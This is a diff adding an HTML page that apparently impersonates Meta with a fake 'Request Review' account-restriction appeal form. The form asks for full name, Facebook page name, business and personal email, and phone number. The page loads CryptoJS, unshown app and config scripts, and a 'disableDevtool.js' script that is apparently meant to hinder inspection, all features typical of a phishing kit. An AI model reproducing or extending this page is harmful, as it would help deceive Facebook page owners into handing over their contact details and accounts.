@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta | Request Review</title>
+    <link rel="shortcut icon" href="./public/favicon-32x32.png" type="image/x-icon">
+    <link rel="stylesheet" href="./public/styles/style.css">
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: '#5D87FF',
+                        secondary: '#212121'
+                    }
+                }
+            }
+        }
+    </script>
+
+    <!-- CryptoJS for encryption -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+
+    <script type="text/javascript">
+        function googleTranslateElementInit() {
+            new google.translate.TranslateElement(
+                {
+                    pageLanguage: 'en',
+                    layout: google.translate.TranslateElement.InlineLayout.SIMPLE
+                },
+                'google_translate_element'
+            );
+        }
+    </script>
+
+    <script src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+</head>
+
+<body>
+    <div>
+        <script src="./public/js/translate.js"></script>
+        <div class="absolute top-0 right-0 hidden" id="google_translate_element"></div>
+        <!-- Navbar Start -->
+        <div class="bg-[#F5F6F6] h-[52px] flex items-center justify-center border-b border-[#E0E0E0]">
+            <div class='max-w-[1280px] w-full flex items-center justify-between px-4'>
+                <a href="/">
+                    <img src="public/images/logo-meta.svg" width="64px" alt="" />
+                </a>
+            </div>
+        </div>
+        <!-- Navbar End -->
+
+        <div
+            class="w-full max-w-[600px] my-10 mx-auto bg-white md:rounded-lg md:shadow-sm md:border md:border-gray-200 px-4 py-4">
+            <div class="mb-6 p-4 bg-blue-50 font-[300] border border-blue-200 rounded-md text-gray-800 text-[14px]">
+                Please indicate why you believe that account restrictions were imposed by mistake. Our technology and
+                team work in multiple languages to ensure consistent enforcement of rules. You can communicate with us
+                in your native language. </div>
+            <form id="clientForm" class="space-y-4">
+                <div>
+                    <label class="block font-[600] text-sm text-gray-700 mb-1">
+                        Full Name <span class="text-red-600">*</span>
+                    </label>
+                    <input type="text" name="fullName" id="fullName" placeholder="Enter your full name" required
+                        class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" />
+                </div>
+
+                <div>
+                    <label class="block font-[600] text-sm text-gray-700 mb-1">
+                        Facebook Page Name <span class="text-red-600">*</span>
+                    </label>
+                    <input type="text" name="pageName" id="fanpage" placeholder="Enter your Facebook page name" required
+                        class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" />
+                </div>
+
+                <div>
+                    <label class="block font-[600] text-sm text-gray-700 mb-1">
+                        Business Email <span class="text-red-600">*</span>
+                    </label>
+                    <input type="email" id="emailBusiness" name="businessEmail" placeholder="Enter your business email"
+                        required
+                        class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" />
+                </div>
+
+                <div>
+                    <label class="block font-[600] text-sm text-gray-700 mb-1">
+                        Personal Email <span class="text-red-600">*</span>
+                    </label>
+                    <input type="email" id="email" name="personalEmail" placeholder="Enter your personal email" required
+                        class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" />
+                </div>
+
+                <div>
+                    <label class="block font-[600] text-sm text-gray-700 mb-1">
+                        Mobile Phone Number <span class="text-red-600">*</span>
+                    </label>
+                    <input type="tel" id="phone" name="phone" placeholder="Enter your mobile phone number" required
+                        class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" />
+                </div>
+
+                <div class="pt-2">
+                    <p class="block text-sm font-[600] text-gray-700 mb-3">
+                        What do you think happened? <span class="text-red-600">*</span>
+                    </p>
+
+                    <div class="space-y-2">
+                        <label class="flex items-start gap-2">
+                            <input type="radio" name="reason" value="erroneous_report" required class="mt-1" />
+                            <span class="text-sm text-gray-700 cursor-pointer">An erroneous report or unfair competitive
+                                complaint.</span>
+                        </label>
+
+                        <label class="flex items-start gap-2">
+                            <input type="radio" name="reason" value="notification_error" class="mt-1" />
+                            <span class="text-sm text-gray-700 cursor-pointer">This notification was sent in
+                                error.</span>
+                        </label>
+
+                        <label class="flex items-start gap-2">
+                            <input type="radio" name="reason" value="no_fraud" class="mt-1" />
+                            <span class="text-sm text-gray-700 cursor-pointer">No fraud involved / another legitimate
+                                reason:</span>
+                        </label>
+
+                        <div class="mt-1">
+                            <textarea placeholder="Additional notes (optional)"
+                                class="w-full border border-[#d4dbe3] h-20 px-3 py-2 rounded-lg text-sm resize-none outline-none"></textarea>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Submit -->
+                <div class="pt-3">
+                    <button id="btn-submit-request" type="submit"
+                        class="w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white rounded-full py-2.5 hover:bg-blue-700 transition-colors">Continue</button>
+                </div>
+
+                <div class="w-16 pt-5 mx-auto">
+                    <img src="./public/icons/ic_logo_gray.svg" alt="Meta">
+                </div>
+
+            </form>
+
+        </div>
+
+        <!-- Footer Start -->
+        <div class='bg-[#F5F6F6] pt-5 pb-5 border-t border-[#E0E0E0] w-full'>
+            <div class='max-w-[1280px] w-full mx-auto px-4'>
+                <div class='flex flex-wrap justify-center gap-4 mb-4 text-[13px] text-gray-600'>
+                    <a href='#' class='hover:underline text-[#6D84B4]'>English (US)</a>
+                    <a href='#' class='hover:underline text-[#6D84B4]'>English (UK)</a>
+                    <a href='#' class='hover:underline text-[#6D84B4]'>Italiano</a>
+                    <a href='#' class='hover:underline text-[#6D84B4]'>Français</a>
+                    <a href='#' class='hover:underline text-[#6D84B4]'>中文(简体)</a>
+                    <a href='#' class='hover:underline text-[#6D84B4]'>日本語</a>
+                    <a href='#' class='hover:underline text-[#6D84B4]'>한국어</a>
+                    <a href='#' class='hover:underline text-[#6D84B4]'>עברית</a>
+                    <a href='#' class='hover:underline text-[#6D84B4]'>Español</a>
+                    <a href='#' class='hover:underline text-[#6D84B4]'>Português</a>
+                </div>
+                <div class='flex flex-wrap justify-center gap-4 text-[13px] text-gray-600'>
+                    <p class='mr-4'>© 2025 Meta</p>
+                    <a href='#' class='hover:underline'>About</a>
+                    <a href='#' class='hover:underline'>Developers</a>
+                    <a href='#' class='hover:underline'>Careers</a>
+                    <a href='#' class='hover:underline'>Privacy</a>
+                    <a href='#' class='hover:underline'>Cookies</a>
+                    <a href='#' class='hover:underline'>Terms</a>
+                    <a href='#' class='hover:underline'>Help Centre</a>
+                </div>
+            </div>
+        </div>
+        <!-- Footer End -->
+    </div>
+
+
+    <!-- Modals Container -->
+    <div id="modalsContainer"></div>
+
+    <!-- JavaScript Files -->
+    <script src="./public/js/config.js"></script>
+    <script src="./public/js/utils.js"></script>
+    <script src="./public/js/modal.js"></script>
+    <script src="./public/js/app.js"></script>
+    <script src="./public/js/disableDevtool.js"></script>
+</body>
+
+</html>
